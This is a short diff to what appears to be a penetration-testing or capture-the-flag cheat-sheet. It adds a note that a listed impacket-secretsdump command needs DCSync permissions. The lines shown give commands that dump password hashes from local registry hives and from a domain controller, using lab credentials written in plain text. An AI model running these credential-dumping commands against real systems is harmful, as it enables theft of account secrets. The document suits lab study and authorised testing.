@@ -2,6 +2,7 @@
 when you have local files
 `impacket-secretsdump -sam sam.hive -system system.hive "DC01$":@10.10.232.150`
 
+when you have `dcsync` permissions
 `impacket-secretsdump spookysec.local/backup:backup2517860@10.10.229.142 -just-dc`
 
 ```sh
